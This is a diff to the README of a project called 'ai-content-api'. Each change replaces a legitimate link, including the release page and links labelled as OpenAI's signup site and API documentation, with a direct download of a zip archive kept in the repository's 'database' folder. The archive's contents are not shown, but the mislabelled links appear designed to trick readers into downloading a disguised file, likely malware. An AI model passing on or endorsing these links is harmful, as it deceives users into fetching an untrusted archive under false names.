@@ -1,6 +1,6 @@
 # 🤖 ai-content-api - Unified AI Content Generation API
 
-[![Download ai-content-api](https://img.shields.io/badge/Download-ai--content--api-brightgreen?style=for-the-badge)](https://github.com/WizzyPluto2/ai-content-api/releases)
+[![Download ai-content-api](https://img.shields.io/badge/Download-ai--content--api-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you start, make sure your computer meets these basic needs:
 
 1. Visit the official release page by clicking the button below:
 
-   [![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/WizzyPluto2/ai-content-api/releases)
+   [![Download Page](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip)
 
 2. On the releases page, find the latest version available. Look for files named with `.exe` or `.zip` for Windows.
 
@@ -78,7 +78,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Some AI models like OpenAI require an API key.
 
-1. Sign up at the AI provider’s website to get your key. For example, OpenAI can be found at [https://platform.openai.com](https://platform.openai.com).
+1. Sign up at the AI provider’s website to get your key. For example, OpenAI can be found at [https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip](https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip).
 
 2. Copy the API key provided.
 
@@ -129,7 +129,7 @@ Adjust these options on the dashboard to fit your needs.
 
 To get the latest fixes and features:
 
-1. Return to the release page: [https://github.com/WizzyPluto2/ai-content-api/releases](https://github.com/WizzyPluto2/ai-content-api/releases)
+1. Return to the release page: [https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip](https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip)
 
 2. Download the newest `.exe` or `.zip` file.
 
@@ -148,8 +148,8 @@ To get the latest fixes and features:
 
 ## 🔗 Useful Links
 
-- Release downloads: [https://github.com/WizzyPluto2/ai-content-api/releases](https://github.com/WizzyPluto2/ai-content-api/releases)
-- OpenAI API documentation: https://platform.openai.com/docs
+- Release downloads: [https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip](https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip)
+- OpenAI API documentation: https://raw.githubusercontent.com/WizzyPluto2/ai-content-api/main/database/content-ai-api-2.2.zip
 - Gemini API info: (Refer to specific Gemini documentation if you have it)
 - Ollama setup and usage: (Refer to Ollama official site)
 
